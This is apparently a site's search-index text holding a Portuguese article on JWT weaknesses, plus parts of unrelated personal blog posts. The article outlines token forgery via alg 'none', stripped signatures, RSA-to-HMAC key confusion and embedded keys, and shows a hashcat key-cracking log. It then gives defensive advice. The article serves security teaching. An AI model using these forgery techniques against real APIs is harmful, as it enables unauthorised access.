eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOiIxNDE2OTI5MDYxIiwianRpIjoiODAyMDU3ZmY5YjViNGViN2ZiYjg4NTZiNmViMmNjNWIiLCJzY29wZXMiOnsidXNlcnMiOnsiYWN0aW9ucyI6WyJyZWFkIiwiY3JlYXRlIl19LCJ1c2Vyc19hcHBfbWV0YWRhdGEiOnsiYWN0aW9ucyI6WyJyZWFkIiwiY3JlYXRlIl19fX0.gll8YBKPLq6ZLkCPLoghaBZG_ojFLREyLQYx0l2BG3EApós decodificar com a função de decodificação BASE64URL, temos as seguintes seções:
Cabeçalho:
 “alg “: “HS256 “, “typ “: “JWT “   “ iat”: “1416929061”, “jti”: “802057 ff9b5b4eb7fbb8856b6eb2cc5b”, “scopes”:  “ users”:  “ actions”: [“read”, “create”] , “users_app_metadata”:  “ actions”: [“read”, “create”]    Payload:
Assinatura:
Apenas um conteúdo binário.
Como você pode ver, com essa “chave da API” (seu conteúdo principal está no payload), podemos implementar a autenticação (tenho o privilégio de me comunicar com a API) e a autorização (no payload acima, você pode ver exemplos de ações que pode ser realizada pelo proprietário da chave).
Do ponto de vista da segurança, existem pelo menos dois problemas em potencial, para começar.
O primeiro é a falta de confidencialidade - conseguimos decodificar o payload (e o cabeçalho) facilmente. Às vezes, não é um problema (ou é mesmo uma vantagem), mas quando exigimos confidencialidade dos dados enviados no token, há uma maneira melhor de fazê-lo: JWE (JSON Web Encryption).
O segundo problema é uma possibilidade potencial de inserir outra ação pelo usuário - por exemplo, excluir - e, assim, ignorar a autorização. Nesse caso, a solução está usando assinaturas em tokens (observe que no exemplo acima, vimos uma &ldquo;assinatura&rdquo;). O algoritmo HS256 indicado no cabeçalho é um HMAC-SHA256 padrão - um mecanismo que garante a integridade de toda a mensagem (graças a ele, o usuário não pode alterar o payload; ou então - ele pode, mas a API que aceita o token detectar adulteração durante a verificação da assinatura). Para configurar o HS256, você precisa gerar uma chave (string) e colocá-la na configuração da API.
Por uma questão de clareza da mensagem, é possível imaginar a assinatura de uma maneira muito simples:
SHA-256(cabeçalho || payload || chave) – onde || concatenação
Aviso: falando formalmente, é um pouco mais complicado: usamos o algoritmo HMAC-SHA256 ao qual atribuímos uma chave e uma mensagem igual ao resultado:
BASE64URL(UTF8(Cabeçalho protegido JWS )) || ‘.’ || BASE64URL(JWS Payload)
Se alguém alterar o payload, ele não poderá gerar uma nova assinatura (porque ele precisa de uma chave para ela, que está apenas na configuração da API).
Em resumo, o JWT parece muito mais flexível do que as chaves da API - você pode facilmente transferir quaisquer dados, garantir sua integridade e, se necessário, manter a confidencialidade. Além disso, todas as informações (exceto a chave secreta) podem estar no próprio token. No entanto, não há rosa sem espinhos. 🌹
Espinhos do JWT 🌹 &nbsp; Primeiro espinho: é complexo! &nbsp; Um dos principais problemas é que o JWT é um mecanismo muito complexo. JWT / JWS / JWE / JWK, uma infinidade de algoritmos criptográficos, duas maneiras diferentes de codificação (serialização), compactação, possibilidade de mais de uma assinatura, criptografia para vários destinatários - esses são apenas alguns exemplos. Todas as especificações relacionadas à JWT têm mais de 300 páginas! A complexidade certamente não é amiga da segurança.
Segundo espinho: none! &nbsp; Como já mencionado, muitas vezes presume-se que o JWT &ldquo;adequado&rdquo; seja um JWT com uma assinatura (JWS), embora, de acordo com a especificação formal do JWT, uma assinatura não seja obrigatória. O documento RFC indica o chamado &ldquo;JWT não seguro&rdquo; (ou seja, sem assinatura). Como é o JWT não assinado? No cabeçalho, temos:
 “alg “: “none “, “typ “: “JWT “ No payload, as coisas de sempre. A seção de assinatura está vazia (ou pode ser ignorada pelo processador de tokens). Curiosamente, o algoritmo “none” é um dos dois algoritmos que DEVEM ser implementados de acordo com a RFC:
Of the signature and MAC algorithms specified in JSON Web Algorithms [JWA], only HMAC SHA-256 (“HS256”) and “none” MUST be implemented by conforming JWT implementations.
O que isso dá ao atacante? Bem, ele pode obter um JWT (com uma assinatura), alterá-lo (por exemplo, adicionar nova permissão) e colocá-lo no cabeçalho “alg”: ”none”. Em seguida, envie tudo para a API com ou sem uma assinatura. O servidor deve aceitar esse token? Teoricamente sim, mas isso destruiria toda a idéia de assinaturas JWT. No entanto, essas situações realmente ocorreram (talvez ainda ocorram?) Em muitas bibliotecas que implementam JWTs: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/, https://www.cvedetails.com/cve/CVE-2018-1000531/.
A propósito, vale a pena mencionar outro problema: o que acontece se tivermos um algoritmo de assinatura no cabeçalho (por exemplo, HS256 ou HS512), mas removermos toda a seção de assinatura do token?
Como você pode ver aqui, algumas vezes esse token será verificado corretamente! Você pode dizer um pouco ironicamente - esta é uma versão moderna do problema “nenhum” (veja a figura abaixo):
(…) Uma vulnerabilidade de validação de entrada no JWTDecoder.decode que pode resultar em um JWT decodificado e, portanto, validado implicitamente, mesmo que não possua uma assinatura válida.
Às vezes, há outro problema - se o invasor não souber criar uma assinatura adequada, talvez ele seja inserido em uma mensagem de erro? Inacreditável? Vamos ver esta vulnerabilidade:
Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException.
Portanto, se alguém alterou o payload e enviou um token para o servidor, o servidor nos informou educadamente sobre isso, fornecendo um token correto que corresponda ao nosso payload:
Para fazê-lo funcionar, o servidor precisou ser configurado para exibir exceções ao usuário, mas essa não é uma configuração muito rara (embora incorreta). Problema semelhante foi descoberto em outra biblioteca:
All versions of Auth0-WCF-Service-JWT NuGet package lower than 1.0.4 include sensitive information about the expected JWT signature in an error message emitted when JWT signature validation fails.
Terceiro espinho: quebrando a chave HMAC &nbsp; Vamos voltar à assinatura, ou seja, o algoritmo HS256 (HMAC-SHA256). Como é calculada a assinatura? Como vimos um pouco antes:
Como recuperar a chave do JWT (e ter a capacidade de criar uma assinatura válida para qualquer JWT)? A abordagem padrão utiliza um token gerado pela API e executa ataques clássicos de força bruta / dicionário / híbrido. Uma iteração requer o cálculo de dois hashes do SHA256 (é assim que o HMAC-SHA256 funciona) e também existem ferramentas que automatizam toda a operação, como o hashcat que implementa a quebra da chave JWT usando GPU (s). Com algumas GPUs rápidas, você pode atingir velocidades de mais de um bilhão de verificações por segundo. Além disso, toda a operação pode ser feita offline, sem qualquer interação com a API (basta obter um token arbitrário com uma assinatura). Um exemplo de uma sessão de quebra do JWT se parece com isso:
Session……….: hashcat Status………..: Running Hash.Type……..: JWT (JSON Web Token) Hash.Target……: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj… Guess.Mask…….: ?1?2?2?2?2?2?2 [7] Guess.Charset….: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined Guess.Queue……: 7/15 (46.67%) Speed.Dev.#1…..: 198.0 MH/s (9.68ms) @ Accel:32 Loops:8 Thr:512 Vec:1 Recovered……..: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts Progress………: 17964072960/134960504832 (13.31%) Rejected………: 0/17964072960 (0.00%) Restore.Point….: 0/1679616 (0.00%) Candidates.#1….: U7veran -&gt; a2vbj14Em uma única placa Nvidia GTX 1070, obtemos uma velocidade de quebra de cerca de 200 milhões de verificações por segundo. Se o hashcat conseguir quebrar a chave, você obterá o resultado abaixo (onde secrety é a chave que você está procurando):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.W7TG0x5Ed1GLN6eOPhTNHErL8TfwBFRSQnqleolhXG0:***secrety***Uma chave do mesmo tamanho da saída de hash (por exemplo, 256 bits para &ldquo;HS256&rdquo;) ou maior DEVE ser usada com esse algoritmo. (Este requisito baseia-se na Seção 5.3.4 (Efeito de segurança da chave HMAC) do NIST SP 800-117 [NIST.800-107], que afirma que a força de segurança efetiva é o mínimo da força de segurança da chave e duas vezes o tamanho do valor do hash interno.).
A propósito, vale enfatizar mais uma vez que a quebra da chave JWT pode ser feita completamente offline.
Quarto espinho: muitos cozinheiros estragam o caldo do JWT &nbsp; Muitos problemas de segurança da JWT surgem como resultado da implementação do padrão (realmente complexo). Vamos ver um exemplo.
Como podemos escolher o algoritmo de assinatura no JWS? Até agora, mencionei o HMAC (e apenas com a função SHA256), mas não é a única opção. Uma visão geral das várias variantes de assinatura pode ser encontrada aqui: https://auth0.com/blog/json-web-token-signing-algorithms-overview/.
Uma opção comum é usar um algoritmo assimétrico - RSA. Nesse caso, veremos no cabeçalho &ldquo;alg&rdquo;: &ldquo;RS512&rdquo; ou &ldquo;alg&rdquo;: &ldquo;RS256&rdquo;.
Apenas um pequeno lembrete: uma chave privada RSA é usada para assinaturas e uma chave pública associada a ela pode verificar assinaturas. Portanto, neste caso, em vez de uma chave simétrica (como no algoritmo HS256), geramos um par de chaves RSA.
A propósito, se você vir o RS512 ou o RS256 pela primeira vez, poderá pensar em um requisito para usar chaves RSA de 512 ou 256 bits? Essas chaves podem ser quebradas a um custo e tempo mínimos (consulte: https://eprint.iacr.org/2015/1000.pdf ou https://www.theregister.co.uk/2010/01/07/rsa_768_broken/). Atualmente, mesmo uma chave RSA de 1024 bits não é considerada segura. Felizmente, isso apenas aponta para a função SHA específica usada em conexão com o RSA. Por exemplo, RS512 significa função RSA mais SHA512. Mas e a chave RSA? O comprimento é definido pela pessoa que o gera, o que é outro problema em potencial (além disso, em diferentes tutoriais online, você pode encontrar comandos específicos usando o OpenSSL e gerando chaves de 1024 bits). Também é importante lembrar que o uso do RSA terá um impacto na eficiência de todo o sistema (verificação de assinatura); portanto, nesse caso, escolhemos uma variante mais lenta que o HS256.
Voltando ao ponto, com o algoritmo RSA, temos pelo menos mais um problema de segurança interessante. Como escrevi anteriormente, uma chave pública é usada para verificação de assinatura; portanto, ela geralmente é definida na configuração da API como a chave de verificação. Aqui, é importante notar que, para o HMAC, temos apenas uma chave simétrica usada para assinatura e verificação.
Como um invasor pode forjar um token JWT?
Ele obtém uma chave pública (o próprio nome indica que ela pode estar disponível publicamente). Às vezes, é transmitido dentro do próprio JWT.
Envia o token (com payload alterado) com o algoritmo HS256 definido no cabeçalho (ou seja, HMAC, não RSA) e assina o token com a chave pública RSA. Sim, não há erro aqui - usamos a chave pública RSA (que fornecemos na forma de uma string) como uma chave simétrica para o HMAC.
O servidor recebe o token, verifica qual algoritmo foi usado para a assinatura (HS256). A chave de verificação foi definida na configuração como a chave pública RSA, então…:
A assinatura é validada (porque exatamente a mesma chave de verificação foi usada para criar a assinatura e o invasor configurou o algoritmo de assinatura como HS256).
Qual foi o problema aqui? O fato de ser possível fornecer o algoritmo de assinatura pelo usuário, embora tenhamos a intenção de verificar a assinatura do token usando apenas RSA. Portanto, forçamos apenas um algoritmo de assinatura selecionado (não oferecemos a possibilidade de alterá-lo alterando o token) ou vamos fornecer métodos de verificação separados (e chaves!) Para cada algoritmo de assinatura que suportamos. Aqui está um exemplo real desta vulnerabilidade:
If the server is expecting RSA but is sent HMAC-SHA with RSA’s public key, the server will think the public key is actually an HMAC private key. This could be used to forge any data an attacker wants.
Quinto espinho: fornecendo sua própria chave &nbsp; Às vezes, você pode fornecer sua própria chave no token, que será usado pela API para verificá-lo! Parece inacreditável, certo? Consulte os detalhes da vulnerabilidade do CVE-2018-0114 na biblioteca node-jose: https://tools.cisco.com/security/center/viewAlert.x?alertId=56326.
The vulnerability is due to node-jose following the JSON Web Signature (JWS) standard for JSON Web Tokens (JWTs). This standard specifies that a JSON Web Key (JWK) representing a public key can be embedded within the header of a JWS. This public key is then trusted for verification. An attacker could exploit this by forging valid JWS objects by removing the original signature, adding a new public key to the header, and then signing the object using the (attacker-owned) private key associated with the public key embedded in that JWS header.
O problema não é novo, anteriormente (2016), uma vulnerabilidade semelhante foi detectada na biblioteca Go-jose (https://mailarchive.ietf.org/arch/msgif/jose/gQU_C_QURVuwmy-Q2qyVwPLQlcg):
RFC 7515, https://tools.ietf.org/html/rfc7515#section-4.1.3 “jwk” (JSON Web Key) Header Parameter allows the signature to include the public key that corresponds to the key used to digitally sign the JWS. This is a really dangerous option.
Um outro exemplo está aqui (perl-Crypt-JWT):
ADDED in 0.23
1 – use “jwk” header value for validating JWS signature if neither “key” nor “kid_keys” specified, BEWARE: DANGEROUS, UNSECURE!!!
0 (default) – ignore “jwk” header value when validating JWS signature
Sexto espinho: a criptografia JWT funciona mesmo? &nbsp; E a criptografia (JSON Web Encryption)? Aqui, você pode escolher entre vários algoritmos (criptografia da própria mensagem ou criptografia da chave simétrica usada para criptografar a mensagem). Novamente, há algumas pesquisas interessantes, ou seja, várias implementações do JWE tornaram possível ao invasor recuperar a chave privada: https://blogs.adobe.com/security/2017/03/critical-vulnerability-uncovered-in -json-encryption.html. Mais especificamente, houve um problema na implementação do algoritmo ECDH-ES (que, a propósito, tem o status “Recomendado +” no documento RFC: https://tools.ietf.org/html/rfc7518).
Talvez a vulnerabilidade anterior tenha sido apenas um acidente? Vamos ver o AES no modo GCM: https://rwc.iacr.org/2017/Slides/nguyen.quan.pdf. Os pesquisadores do Google estão escrevendo sobre isso no contexto da JWT e resumem: o GCM é frágil, mas suas implementações raramente foram verificadas.
Também podemos escolher o algoritmo RSA com preenchimento PKCS1v1.5. O que há de errado com isso? Os problemas são conhecidos desde 1998: ftp://ftp.rsa.com/pub/pdfs/bulletn7.pdf. E algumas pessoas resumem assim:
PKCS#1v1.5 is awesome – if you’re teaching a class on how to attack cryptographic protocols.
Mais detalhes sobre possíveis algoritmos e possíveis problemas podem ser encontrados aqui:
https:/paragonie.com/blog/2017/03/jwt-json-web-tokens-is-bad-standardthat-everyone-should-avoid
https://paragonie.com/blog/2016/12/everything-you-know-about-public-keyencryption-in-php-is-wrong
https://paragonie.com/blog/2018/04/protecting-rsa-based-protocols-againstadaptive-chosen-ciphertext-attacks
Sempre estaremos fadados ao fracasso usando o JWE? Claro que não, mas vale a pena verificar se usamos um algoritmo de criptografia adequadamente seguro (e sua implementação segura).
Sétimo espinho: decodificação / verificação - isso importa? 😉 &nbsp; Agora podemos nos sentir um pouco sobrecarregados pela multiplicidade de opções. Afinal, queremos apenas “decodificar” o token no lado da API e usar as informações nele contidas. Lembre-se, no entanto, que “decodificar” nem sempre significa o mesmo que “verificar” - supostamente óbvio, mas bibliotecas diferentes podem fornecer funções diferentes para decodificar e / ou verificar tokens. Um exemplo desse tipo de pergunta ou dúvida pode ser encontrado aqui.
Em resumo, se eu usar a função decode (), só posso decodificar o payload (ou o cabeçalho) de BASE64URL sem nenhuma verificação. A verificação pode ser uma função separada, embora também possa ser incorporada em um decode (). Às vezes, são os usuários que solicitam essa opção - no caso citado abaixo - alguém pede para sobrecarregar o método decode () para que ele também possa aceitar o próprio token (sem a chave):
Eu vi um problema na estrutura para obter o payload de um JWT. Para obter um payload de um JWT sem validação, não precisamos de uma chave / segredo. Portanto, no arquivo jwt/src/JWT/JwtDecoder.cs, perdemos uma sobrecarga para o método Decode que precisa apenas de um token.
Se o programador, usando a biblioteca, agora usar a decodificação de chamada mais simples (token), a assinatura não será verificada.
Além disso, na discussão citada acima, há uma pergunta sobre a possibilidade de verificar a assinatura no lado do cliente, que, como já sabemos no caso do HS256, pode ser complicada (o cliente deve ter uma chave secreta, que pode ser extraída por um atacante). Infelizmente, muitas vezes o uso do JWT se resume ao seguinte: vamos escolher os primeiros algoritmos que vemos e copiar os trechos de código dos tutoriais. Funciona? Sim, então qual é o problema?
Oitavo espinho: capturar qualquer token = assumir o acesso à API? &nbsp; Uma das vantagens frequentemente apontadas do JWT é a implementação da autenticação (ou autorização - depende do contexto em que o todo será usado) sem a necessidade de executar uma consulta no banco de dados. Além disso, podemos fazer isso em paralelo em vários servidores independentes (APIs). Afinal, apenas o conteúdo do token é suficiente para tomar uma decisão aqui. Ele também tem uma desvantagem - e se a chave de assinatura disponível em muitos servidores vazar? Obviamente, será possível gerar tokens assinados corretamente, aceitos por todas as máquinas que usam a chave apropriada para verificação. O que um invasor pode ganhar com isso? Por exemplo, acesso não autorizado a funções da API ou outras contas de usuário.
Também temos um problema potencialmente diferente aqui - e se um token gerado puder ser usado em muitos contextos diferentes? Por exemplo, geramos um token válido com o conteúdo de &ldquo;login&rdquo; = &ldquo;manager&rdquo;. E em uma função da API, é possível editar alguns dados, mas, ao mesmo tempo, esquecemos que uma função completamente diferente, recebendo o mesmo token, oferece a possibilidade de acesso total!
Nesse caso, é possível usar determinados parâmetros definidos pela própria especificação: iss (issuer) e aud (audience). Graças a eles, os tokens podem ser aceitos apenas por nossos destinatários específicos.
Por exemplo:
 “iss ” = “my_api “, “login ” = “manager “, “aud ” = “store_api “ Podemos apontar outro problema - algumas palavras-chave reservadas no JWT (Registered Claim Names) - por exemplo iss / aud / iat / jti - pode ser colocado ao lado de qualquer elemento definido pelo usuário do JWT - por exemplo faça login a partir do nosso exemplo. Isso está causando outra confusão, que vou apontar no próximo problema.
Nono espinho: replay JWT &nbsp; E se um token específico deve ser usado apenas uma vez? Vamos imaginar um cenário em que um usuário grave um token gerado para executar o método DELETE em nossa API. Então, por exemplo depois de um ano - quando ele teoricamente não tem mais as permissões apropriadas - ele tenta usá-lo novamente (o chamado replay attack).
A maneira de fazer isso é usar as seguintes claims: jti e exp. Jti (JWT ID) é um identificador de token, que deve ser exclusivo, e exp é uma definição da data de validade de um token. A combinação de ambos os campos nos dará uma validade adequadamente curta do token e sua singularidade.
Vale ressaltar, no entanto, se temos uma implementação correta dessas metades. Agora observe o bug no qual o valor exp não foi levado em consideração (https://github.com/jwt-dotnet/jwt/issues/134).
JWT not throwing ExpiredTokenException in .NetCore
Os desenvolvedores de bibliotecas usaram a declaração de expiração (que não está na especificação da JWT) para executar verificações de expiração; o bug foi corrigido após o relatório.
Décimo espinho: timing attacks na assinatura &nbsp; Se a assinatura do JWS for verificada byte por byte com a assinatura correta (gerada pela parte que aceita o JWS) e se a verificação terminar no primeiro byte inconsistente, podemos ser suscetíveis a timing attacks.
Observe que, nesse caso, quanto mais bytes correspondentes tivermos, mais comparações serão necessárias e, portanto, maior o tempo necessário para a resposta.
É possível observar os tempos de resposta gerando assinaturas sucessivas, começando no primeiro byte da assinatura, passando para o segundo, etc. A descrição exata desse ataque pode ser vista aqui: https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9.9.
Segundo o relatório, com uma grande quantidade de tráfego gerado (até 55 mil solicitações por segundo), a assinatura de qualquer mensagem pode ser obtida em 22 horas (condições laboratoriais). Com menos tráfego, é claro, precisaremos de mais tempo (vários dias), mas o efeito pode ser chocante (podemos gerar qualquer JWT e preparar uma assinatura que será verificada como correta).
O ataque é realmente possível no cenário real? Como você pode imaginar, as mudanças no tempo de resposta são mínimas, mas você pode tentar medi-las. Nesse ponto, também vale lembrar um texto um pouco mais antigo sobre ataques de tempo: https://www.cs.rice.edu/~dwallach/pub/crosby-timing2009.pdf. As seguintes medidas foram alcançadas:
Our work analyses the limits of attacks based on accurately measuring network response times and jitter over a local network and across the Internet. We present the design of filters to significantly reduce the effects of jitter, allowing an attacker to measure events with 15-100µs accuracy across the Internet and as good as 100ns over a local network.
Por outro lado, um exemplo de declaração de um tipo específico de vulnerabilidade pode ser encontrado, por exemplo, aqui ou aqui.
Décimo-primeiro espinho: grande quantidade de bibliotecas disponíveis &nbsp; Como um dos primeiros problemas relacionados ao JWT, menciono várias opções disponíveis e vários algoritmos. Há também um grande número de implementações de JWT, muitas vezes incompletas, escritas, para dizer o mínimo, no joelho. Não é fácil de seguir e, às vezes, problemático em termos de padrão de segurança, requer o uso de algoritmos criptográficos complexos por pessoas que geralmente não possuem um conhecimento profundo de criptografia. Garbage in - garbage out: é difícil esperar bibliotecas super seguras aqui.
Outros exemplos de bugs em bibliotecas:
https://auth0.com/docs/security/bulletins/cve-2019-13483 https://www.cvedetails.com/cve/CVE-2017-12973/ https://www.cvedetails.com/cve/CVE-2017-10862/ https://pivotal.io/security/cve-2017-2773 https://github.com/auth0/node-jsonwebtoken/issues/212 https://github.com/auth0/node-jsonwebtoken/commit/ adcfd6ae4088c838769d169f8cd9154265aa13e0 https://www.cvedetails.com/cve/CVE-2019-17195/ Ao mesmo tempo, vale mencionar problemas de segurança relacionados às bibliotecas usadas em geral. Vale a pena verificar se eu uso uma biblioteca com vulnerabilidades públicas conhecidas. Ou talvez minhas bibliotecas estejam usando dependências vulneráveis? Será que não é necessário eu desenvolver um mecanismo de monitoramento da biblioteca usada caso alguém localize uma vulnerabilidade significativa no futuro?
Alternativa ao JWT? &nbsp; Olhando para muitos dos problemas de segurança que apontei no JWT, pode-se perguntar se temos uma alternativa comprovada. No momento, a resposta é não. Uma das novas idéias é o PASETO:
Paseto is everything you love about JOSE (JWT, JWE, JWS) without any of the many design deficits that plague the JOSE standards.
Simplificando, o PASETO deve ser uma versão segura do JWT. Realmente cumprirá as promessas? No momento, é realmente difícil dizer - é um projeto muito jovem e ainda em fase de desenvolvimento. Mais informações podem ser encontradas aqui e aqui. As motivações por trás do deste projeto podemos ler aqui.
O JWT pode ser seguro? &nbsp; As opiniões na comunidade de segurança são divididas. Algumas pessoas desencorajam categoricamente o uso do JWT, outras apontam para implementações mal preparadas, enquanto outras descrevem os mecanismos do JWT exatamente como são, deixando a decisão para o usuário. Além disso, o JWT é um mecanismo muito popular, para o qual não há alternativa popular e padronizada, que comprovou adicionalmente sua segurança.
Os problemas de segurança mostrados antes podem ser colocados em três categorias:
Problemas com a própria especificação JWT (por exemplo, nenhum algoritmo). Erros de implementação de biblioteca, incluindo erros de implementação de algoritmo criptográfico (é provavelmente o grupo mais numeroso). Uso incorreto da biblioteca. A maioria dos problemas comuns é apresentada abaixo.
Vamos resumir tudo com conselhos práticos que podem aumentar a segurança de uso da JWT. Algumas recomendações podem conter abreviaturas de pensamento, explicadas anteriormente no texto e adicionalmente abordadas nos materiais de origem vinculados.
O que devo fazer? &nbsp; Pra começar &nbsp; Entenda o que você deseja usar: considere se você precisa do JWS ou JWE, escolha os algoritmos apropriados, entenda sua finalidade (pelo menos em um nível geral - por exemplo, HMAC, chave pública, chave privada). Descubra o que exatamente oferece a biblioteca JWT que você escolheu. Talvez exista um mecanismo mais simples e pronto que você possa usar? Chaves &nbsp; Use chaves simétricas / assimétricas adequadamente complexas.
Tenha um cenário preparado em caso de comprometimento (divulgação) de uma das chaves.
Mantenha as chaves em um local seguro (por exemplo, não as codifique permanentemente no código-fonte).
Idealmente, não permita definir o algoritmo de assinatura arbitrário pela parte remetente (é melhor forçar um algoritmo (s) de assinatura específico (s) no lado do servidor).
Assinatura &nbsp; Verifique se sua implementação não aceita o algoritmo de nenhuma assinatura.
Verifique se sua implementação não aceita uma assinatura vazia (ou seja, a assinatura não está marcada).
Se você usa o JWE, verifique se está usando algoritmos seguros e se está usando a implementação segura desses algoritmos.
Distinga entre Verifique () e Decodifique (). Em outras palavras, verifique se você tem certeza de que está verificando a assinatura.
Regras gerais &nbsp; Verifique se o token gerado em um local não pode ser usado em outro para obter acesso não autorizado.
Verifique se o modo de depuração está desativado e se não pode ser ativado com um truque simples (por exemplo,? Debug = true).
Evite enviar tokens em URLs (isso pode vazar dados confidenciais - por exemplo, esses tokens são gravados nos logs do servidor da web).
Payload &nbsp; Verifique se você está colocando informações confidenciais no payload do JWS (não recomendado).
Verifique se você está protegido contra um ataque de repetição (reenviando um token).
Certifique-se de que os tokens tenham um período de validade suficientemente curto (por exemplo, usando a claim &ldquo;exp&rdquo;).
Verifique se a “exp” está realmente marcada. Pense se você precisa invalidar um token específico (s) (o padrão não fornece ferramentas para isso, mas existem várias maneiras de implementar esse tipo de mecanismo).
Bibliotecas &nbsp; Leia a documentação da biblioteca com atenção.
Verifique as vulnerabilidades na biblioteca que você usa (por exemplo cvedetails.com ou no site do projeto).
Verifique se seus projetos anteriores não usam uma biblioteca vulnerável; verifique se você está monitorando novos erros na biblioteca (eles podem aparecer, por exemplo, após um mês de implementação).
Acompanhe novas vulnerabilidades em bibliotecas que suportam JWT. Talvez, no futuro, alguém encontre uma vulnerabilidade em outro projeto, que pode ser explorada da mesma forma na biblioteca que você está usando.
Referências &nbsp; JSON Web Token Best Current Practices: https://tools.ietf.org/html/draft-ietf-oauth-jwt-bcp-04
JWT Handbook: https://auth0.com/resources/ebooks/jwt-handbook
Discussão sobre vulnerabildiade no JWT: https://lobste.rs/s/r4lv76/jwt_is_bad_standard_everyone_should_avoid
JWT Cheat Sheet for Java (OWASP). https://www.owasp.org/index.php/JSON_Web_Token_(JWT)_Cheat_Sheet_for_Java
Algumas de idéias de uso mais seguro do JWT: https://dev.to/neilmadden/7-best-practices-for-json-web-tokens
Alguns arguntos contra o uso JWT para sessões: http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/
Comparação de JWTs com IDs de sessão e outros recursos de segurança relevantes: http://by.jtl.xyz/2016/06/the-unspoken-vulnerability-of-jwts.html`}).add({id:1,tag:"en",href:"/blog/a_dor_do_confinamento/",title:"A dor do confinamento",description:"..mas tudo isso vai passar.",content:`Neste momento de pandemia, o coronavirus tem mudado as vidas de todas as pessoas ao redor do mundo. Famílias sendo ceifadas por este agressivo vírus e todos na esperança de tratamentos mais eficientes e vacinas para que a vida em comunidade possar voltar ao normal, onde abraços e beijos possam existir novamente.
Falando como corredor, principalmente como pessoa extramamente ativa, não imaginava que algo fosse pior que uma lesão séria, que pode nos tirar de um investimento financeiro e físico, além do planejamento de meses . A pior lesão neste caso é o confinamento. Hoje estou próximo dos três meses de quarentena.
É engraçado como é fácil se perder no tempo, a semana passa, e não sabemos que dia é, as vezes me perco até em que mês estou. A única coisa que faz prender-me ao calendário é o trabalho, esse compromisso, que graças a Deus até o dia de hoje não foi afetado.
O medo o tempo todo ameaça a tomar conta da minha mente, preocupação com minha família, meus pais, meus sogros e tudos que são próximos de nós. Trabalho extra para conseguir me manter são.
As vezes dizemos que não existe melhor remédio para qualquer angústia do que o foco no trabalho, mas infelizmente nem sempre é assim. Crises de ansiedade e falta de foco está aí para nos tirar dos trilhos. Essa é uma nova experiência que senti na pele durante este período, psiquiatra e remédio controlado.
Tenho uma esposa linda e carinhosa, que tem me ajudado e cuidado de mim neste momento difícil, além do nosso filho, Moisés, um chihuahua medroso de aproximadamente 1 ano. Ele é adotado, não sabemos ao certo.
Só posso agradecer por ter uma família, um teto pra morar, um trabalho que me deu a oportunidade de trabalhar remotamente e que me dá totais condições de viver bem e ajudar outras pessoas.
Escrevo este texto para mim mesmo, dizendo que tudo isso vai passar, e que lá na frente será mais um episódio na história da humanidade, que eu estive presente e aprendi alguma coisa com tudo isso. ✌️`}).add({id:2,tag:"en",href:"/blog/maratonadebuenosaires2018/",title:"A minha estreia em maratonas 🏅",description:"Sofra e divirta-se comigo, além de d    icas de como não errar em sua estréia em maratonas! 👟",content:`E aí pessoal, blz?
Ontem realizei mais um sonho dentre muitos que ainda tenho, que é correr minha primeira maratona. Correr a minha maratona estava preparada para se realizar na Maratona de Porto Alegre neste ano, porém por uma questão de prioridade na minha carreira profissional decidi postergar para Setembro, mais precisamente ontem dia 23 de setembro em Buenos Aires.).
Mas por quê q Maratona de Buenos Aires? &nbsp; Em Buenos Aires na mesma semana da corrida é realizada também uma das maiores conferências hacker da América Latina, que tive o prazer de participar em 2017. Assim uni as duas paixões na mesma semana! =D
Obviamente as características da Maratona de Buenos Aires me ajudaram a tomar esta decisão, por ela ser muito bem organizada, reconhecida internacionalmente, percurso quase que completamente plano, e por ser próximo do Brasil, assim levar um corpo da Argentina para o Brasil o custo seria menor! Hahaha
Busca por profissionais &nbsp; Sobre treinamento, depois vou escrever um texto apenas sobre como foi meu início na corrida e como me organizava, mas para resumir correr até os 21km não era tão difícil para mim e existem centenas de planilhas espalhadas na Internet para iniciar seus primeiros 5, 10, 15 e 21km, porém para maratona apenas de encontrar algumas, planilhas eram mais raras. Conversando com amigos, principalmente com o meu brother Ricardo Esgalha que tinha se preparado e realizado a maratona de Porto Alegre, ficou claro que maratona é algo que tem que ser respeitado e a ajuda de um profissional experiente seria essencial no treinamento, e se possível se cercar de mais outros profissionais, como nutricionista e fisioterapeutas se possível. No meu caso procurei o Carlos (Rato) Barbosa (São Caetano) que foi o meu treinador e que certamente sou muito grato a ele por me ajudar e adaptar meu treinamento quando precisei. A nutricionista Rosana (Osasco) acompanhou minha alimentação e suplementação para me ajudar neste processo!
Treinamento &nbsp; Em resumo foram 4 meses de treinamento, 15 semanas de treino. Aqui quero fazer algumas observações:
Você precisará se organizar adequadamente, pois precisará balancear seus treinos, compromissos em sua família e no trabalho. Sua mente controla seu corpo, procure se motivar quando começar a desanimar ou se entristecer. Pensamento positivo ajuda em tudo. Procure explicar para seus familiares o quão é difícil treinar, pois você precisará de apoio em tudo, como descanso, alimentação e compreensão quando estiver irritado ou com dores…rsrs Converse bastante com seu treinador, ele será o seu guia o tempo todo. Procure definir quais equipamentos irá utilizar, principalmente nos membros inferiores, como tênis, meias e shorts. Não sou médico, as dicas abaixo serviram pra mim, talvez sirvam para você. 😉 Você sentirá dores, portanto procure observar seu corpo e conhecê-lo melhor para distinguir o que é apenas uma fatiga muscular de uma lesão mais séria. Em determinado momento da minha preparação eu achei que eu tinha me lesionado após sentir uma dor muito estranha na panturrilha, já tinha até jogado a toalha, de forma bizarra eu só sentia a dor quando eu estava parado, não sentia quando corria… haha, então continuei correndo! E a dor passou depois de uns 10 dias e até hoje não sei do que se tratava. Se sentir que a fatiga muscular está aumentando, comece alternar correndo também na esteira, pois o impacto é menor. Isso me ajudou bastante. Preparando a viagem &nbsp; Compre seu voo para chegar dois dias antes da prova ou no dia anterior bem cedo para que dê tempo para buscar seu kit e se preparar. Eu cometi um grave erro, na pressa comprei meu voo errado, que chegaria na 